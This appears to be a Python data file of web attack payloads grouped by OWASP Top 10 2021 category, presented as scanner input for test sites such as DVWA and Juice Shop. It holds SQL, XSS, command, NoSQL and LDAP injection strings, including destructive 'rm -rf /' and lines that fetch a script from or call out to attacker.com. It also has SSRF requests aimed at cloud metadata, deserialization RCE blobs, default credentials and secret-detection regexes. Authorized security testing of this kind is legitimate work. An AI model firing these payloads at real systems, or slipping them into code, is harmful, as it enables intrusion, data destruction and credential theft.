# Advanced payloads for OWASP Top 10 2021 vulnerabilities
# Compiled from OWASP Testing Guide, GitHub security repos, and writeups
# Designed for educational use on vulnerable test sites (e.g., DVWA, Juice Shop)

# A03: Injection (SQLi, XSS, Command, NoSQL, LDAP)
SQLI_PAYLOADS = [
    # Basic SQL injections
    "'", "1' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "'; DROP TABLE users; --",
    # Blind/time-based for improved detection
    "1' AND SLEEP(5)--", "1' UNION SELECT 1,2,3--", "1' AND (SELECT * FROM (SELECT SLEEP(5))x)--",
    "admin' --", "1' ORDER BY 1--", "1' UNION ALL SELECT NULL, NULL--",
    # Advanced: Blind, error-based, and DBMS-specific (MySQL, MSSQL, Oracle)
    "1 AND IF(1=1, SLEEP(5), 0)", "'; WAITFOR DELAY '0:0:5'--", "1' AND 1=CONVERT(int, @@version)--",
    "1' OR 1=1 LIMIT 1 OFFSET 0--", "1' UNION SELECT user(), database(), version()--",
    "1' AND EXISTS(SELECT * FROM information_schema.tables)--",
    # Out-of-band (OOB) for DNS-based detection
    "1' AND (SELECT 1 FROM dual WHERE (SELECT 1 FROM dual) IN (SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\'))))--"
]

XSS_PAYLOADS = [
    # Basic reflected/stored XSS
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "javascript:alert('XSS')",
    '"><svg/onload=alert(1)>', "<Script>alert('hi')</scripT>",
    # Advanced: Filter bypass, DOM-based, case variations
    "<svg onload=alert(1)>", "jaVasCript:alert(1)", "<iframe src='javascript:alert(1)'></iframe>",
    "<details open ontoggle=alert(1)>", "<math><mi xlink:href='javascript:alert(1)'></mi></math>",
    "<sVg/oNloAd=alert(1)>", "';alert(1);//", "<body onload=alert(1)>", "onmouseover=alert(1)",
    # Polyglot and advanced bypass (from GitHub writeups)
    "<img/src=` onerror=alert(1)>", "<a href=javascript\\x3Aalert(1)>Click</a>",
    "<input value='' onfocus=alert(1) autofocus>", "<script>eval('al'+'ert(1)')</script>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
]

COMMAND_INJ_PAYLOADS = [
    # Basic command injections
    "; ls", "| whoami", "&& rm -rf /", "; cat /etc/passwd",
    # Advanced: Blind, chained, and encoding bypasses
    "; ping -c 5 127.0.0.1", "$(whoami)", "`ls`", "; curl http://attacker.com",
    "; netstat -an", "|| ls", "; echo 'hacked' > hacked.txt", "$(id)",
    "; sleep 5", "& dir", "; echo $PATH", "; wget http://attacker.com/mal.sh -O /tmp/mal.sh"
]

NOSQL_PAYLOADS = [
    # MongoDB-specific injections
    '$ne: null', '{"$gt": ""}', '{"$in": [null]}',
    # Advanced NoSQL (MongoDB, CouchDB)
    '{"$where": "sleep(5000)"}', '{"$ne": {"$func": "return true"}}',
    '{"$regex": ".*"}', '{"$eq": {"$code": "function(){return true}"}}'
]

LDAP_PAYLOADS = [
    # Basic LDAP injections
    "*)(uid=*))(|(uid=*)", "admin*)(&(objectClass=*)", "*)(|(&objectClass=*)",
    # Advanced filter bypass
    "*)(|(objectClass=*)", "cn=*)(*",
    "(&(objectClass=*)(uid=*))", "!(uid=admin)"
]

# A10: Server-Side Request Forgery (SSRF)
SSRF_PAYLOADS = [
    # Basic internal resource access
    "http://localhost/", "http://127.0.0.1/admin", "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd", "http://internal.service/",
    # Advanced: Protocol-based, cloud metadata, and bypasses
    "gopher://127.0.0.1:6379/_%0d%0aINFO", "dict://127.0.0.1:6379/info",
    "http://[::]:80/", "http://0x7f000001/", "http://127.0.0.1:22/",
    "ftp://127.0.0.1:21/", "jar:http://127.0.0.1:80/!/",
    "http://127.0.0.1:8080/api/health", "file:///proc/self/environ",
    "http://localhost:9200/_cluster/health"  # Elasticsearch
]

# A08: Software and Data Integrity Failures (Insecure Deserialization)
DESERIAL_PAYLOADS = [
    # Python pickle (base64 encoded)
    "gASVDAAAAAAAAACMCXBvc2l4lIwGc3lzdGVtlJOUjAZsc5QSlC4=",
    # YAML (Python-specific)
    "---\n!!python/object/apply:os.system\nargs: ['ls']",
    # JSON-based deserialization
    '{"__class__": "__main__.Eval", "code": "print(\'hacked\')"}',
    # Advanced: Multi-language, from writeups
    "cos\nsystem\n(S'ls -la'\ntR.",  # Pickle RCE
    "--- !ruby/object:Gem::Installer\ni:@package_version: !ruby/object:Gem::Version\n  version: '0.1'\n",  # Ruby YAML
    # PHP serialized object
    'O:8:"stdClass":1:{s:4:"exec";s:7:"system";}',
    # Java serialized (base64 for simplicity)
    "rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcAUQzVRb84J3zQIAA0kAB2xvYWRGYWN0b3JJAAl0aHJlc2hvbGRMAANtYXB0AB9MamF2YS91dGlsL01hcDt4cD9AAAAAAAB3BAAAAHg="
]

# A07: Identification and Authentication Failures
BROKEN_AUTH_PAYLOADS = [
    # Common weak credentials
    ("admin", "admin"), ("user", "password"), ("test", "test123"),
    ("root", "root"), ("admin", "password123"),
    # Advanced: Top weak passwords (from 2023 breaches)
    ("admin", "123456"), ("guest", "guest"), ("user", "qwerty"),
    ("admin", "admin123"), ("test", "password1")
]

# A02: Cryptographic Failures
CRYPTO_PATTERNS = {
    # Weak hashing algorithms
    'weak_hash': r'(md5|sha1|sha-1)\(',
    # Non-HTTPS or sensitive http links (exclude common schemas)
    'http_no_s': r'http://(?!www\.w3\.org|schemas|example\.com|localhost)',
    # Hardcoded credentials
    'hardcoded_key': r'(api_key|secret|password|key|token)\s*=\s*["\'][a-zA-Z0-9]{16,}',
    # Exposed private keys
    'private_key': r'-----BEGIN (RSA|EC|DSA) PRIVATE KEY-----'
}

# A01: Broken Access Control
ACCESS_CONTROL_TESTS = [
    # Path traversal and IDOR
    "../admin", "/user/1/edit?user=2", "/secret", "../../etc/passwd", "/api/v1/users/1?user=admin",
    # Advanced: API endpoints, hidden paths
    "/.git/config", "/api/keys", "/backup.sql", "/admin/login?role=superuser",
    "/user/1/delete?token=invalid"
]

# A05: Security Misconfiguration
MISCONFIG_PATTERNS = [
    # Debug modes, error leaks, default configs
    "debug=true", "error in syntax", "stack trace", "version: 1\.[0-9] (vulnerable)",
    "default password", "admin:admin", "X-Powered-By: PHP/[0-5]\.",
    # Exposed sensitive files
    ".env", ".git/HEAD", "wp-config.php", "config/database.yml"
]

# A06: Vulnerable and Outdated Components
VULN_COMPONENTS_CMD = "pip-audit --requirement requirements.txt"

# A09: Security Logging and Monitoring Failures
LOGGING_CHECKS = [
    # Expected log-related strings
    "failed login", "error occurred", "access denied log", "security event",
    "authentication attempt", "403 Forbidden logged"
]

# A04: Insecure Design
INSECURE_DESIGN_TESTS = [
    # Rate limiting, weak auth design
    "POST /login with 100 requests",
    "GET /api/no-auth-token", "POST /reset-password/no-verification"
]